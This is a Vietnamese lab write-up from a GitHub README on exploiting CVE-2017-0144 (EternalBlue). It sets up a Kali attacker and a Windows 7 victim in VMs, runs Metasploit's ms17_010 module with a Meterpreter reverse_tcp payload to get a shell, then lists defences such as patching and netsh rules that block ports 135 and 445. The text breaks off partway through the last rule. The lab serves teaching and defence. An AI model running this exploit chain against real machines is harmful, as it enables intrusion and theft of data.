# Vulnerability-Research-CVE-2017-0144
LAB: TẤN CÔNG HỆ ĐIỀU HÀNH WINDOWS DỰA VÀO LỖ HỔNG GIAO THỨC SMB.
![mohinh](https://github.com/ducanh2oo3/Vulnerability-Research-CVE-2017-0144/assets/143213966/3aa09842-4abf-40ad-8f2a-76e1438671df)
I. MÔ TẢ        
Trong bài lab ta sẽ sử dụng hai máy tính để mô phỏng một cuộc tấn công dựa vào lỗ hổng trong giao thức SMB của Hệ điều hành Windows. Một máy chạy HĐH Kali Linux, đóng vai trò kẻ tấn công (hacker). Và một máy tính đóng vai trò là máy nạn nhân (victim). Máy victim đang chạy Hệ điều hành Windows 7 64 bit có chứa lỗ hổng SMB. Để làm được điều này, trên máy Kali Linux ta sẽ sử dụng mã khai thác có tên là EternalBlue để tấn công vào máy Windows 7.
II. GIỚI THIỆU CHUNG
Server Message Block (SMB) là một giao thức chia sẻ file khá phổ biến trên nền tảng Windows của Microsoft. Nhờ vào giao thức SMB này mà các máy tính Windows kết nối với nhau trong cùng một lớp mạng hay trong cùng một Domain có thể chia sẻ file được với nhau. Cho đến nay, SMB còn có tên gọi khác là Common Internet File Sharing (CIFS).
EternalBlue là một mã khai thác thông tin, dựa vào lỗ hổng của giao thức SMB thông qua cổng 445. Ban đầu, EternalBlue được phát triển bởi Cục An Ninh Quốc Gia Hoa Kỳ (NSA). Tên đầy đủ tiếng Anh là U.S. National Security Agency. Nhưng sau đó, nó bị rò rỉ bởi nhóm Hacker The Shadow Brokens vào năm 2017. Cũng trong cùng năm đó. Một đợt tấn công quy mô lớn của Virus mã hoá dữ liệu – Ransomware, nhằm vào các máy tính chạy Windows của Microsoft, diễn ra trên toàn thế giới. Trong đó, nổi tiếng nhất vẫn là virus WannaCry . Cho đến nay mặc dù lỗ hổng này đã được vá bởi Microsoft bằng bản cập nhật bảo mật MS17-010. Tuy nhiên, trên thế giới một số lượng lớn máy tính đang chạy Hệ điều hành Windows vẫn còn tồn tại lỗ hổng này. Lỗ hổng này được công bố trong CVE-2017-0144. (Windows SMB Remote Code Execution Vulnerability). Lỗ hổng này vô cùng nguy hiểm và rất dễ dàng bị khai thác. Điều đáng nói là để tấn công qua lỗ hổng giao thức SMB này. Hacker không cần phải gởi hay lừa cho nạn nhân tải về hoặc chạy bất kì một virus độc hại nào đó. Tức là nạn nhân cho dù không làm gì cả nhưng vẫn bị hacker dễ dàng tấn công chiếm quyền điều khiển máy tính mà không hề hay biết.
III. CHUẨN BỊ
Chuẩn bị 02 máy ảo chạy trên phần mềm VMware Workstation. Máy ảo Kali Linux (máy hacker) có địa chỉ IP là: 192.168.198.140 và máy ảo Windows 7 (máy victim) có địa chỉ IP là: 192.168.198.143
![mohinh2](https://github.com/ducanh2oo3/Vulnerability-Research-CVE-2017-0144/assets/143213966/168c6b06-ca93-4f37-a224-7edd0d930e1a)
1.Trên máy ảo Kali(attack):
-Kiểm tra ip: ifconfig 
-Tiến hành khởi chạy dịch vụ Postgresql: # service postgresql start
-Kiểm tra postgresql đã chạy hay chưa ta dùng lệnh: # service postgresql status
2.Trên máy ảo Windows 7(victim):
-Kiểm tra ip : ipconfig
-Tắt tường lửa (Firewall).
IV. THỰC HIỆN TẤN CÔNG.
* Trên máy Kali: Đăng nhập vào Metasploit bằng câu lệnh: # msfconsole
* ![image](https://github.com/ducanh2oo3/Vulnerability-Research-CVE-2017-0144/assets/143213966/6c371cc9-3c80-424a-99cf-5bb4c01397e1)
* Khi đã vào được Metasploit ta tìm kiếm những lỗi cũng như các cú pháp liên quan đến ms17_010 bằng lệnh: # search ms17_010
* ![image](https://github.com/ducanh2oo3/Vulnerability-Research-CVE-2017-0144/assets/143213966/5cd78321-27eb-4eaf-ad3a-1c6cef442c5d)
* Thêm địa chỉ IP máy victim,máy attack
* Thiết lập payload để khai thác:
* use 0 -> set payload windows/x64/meterpreter/reverse_tcp:
* Chạy exploit để tiến hành khai thác        
* ![image](https://github.com/ducanh2oo3/Vulnerability-Research-CVE-2017-0144/assets/143213966/23176523-1a59-46c5-b71d-0f6efcc03e42)
-Mở shell trên máy nạn nhân (thực hiện qua terminal máy attack) sau khi đã xâm nhập đc vào:
![image](https://github.com/ducanh2oo3/Vulnerability-Research-CVE-2017-0144/assets/143213966/7fd22f35-b23f-46a1-b372-910873b05c39)
=>Đến đây xem như hacker đã thành công xâm nhập vào máy victim. Lúc này, hacker có thể xoá, ăn cắp file từ máy nạn nhân mà họ không hề hay biết. Thậm chí, hacker có thể upload và chạy virus trực tiếp trên đó.
V. CÁCH PHÒNG CHỐNG.
– Để tránh bị khai thác và lợi dụng giao thức SMB. Ta cần thực hiện một số công việc sau:
*Kích hoạt tường lửa (Firewall).
*Cập nhật Windows lên bản mới nhất. Hoặc tải và cập nhập các bản vá bảo mật của Microsoft. Nhất là bản vá bảo mật ms17_010.
*Chặn các port 135, 445.
+netsh advfirewall firewall add rule dir=in action=block protocol=TCP localport=135 name="Block_Cong_135"
+netsh advfirewall firewall add rule dir=in action=block protocol=TCP localport=445 nam

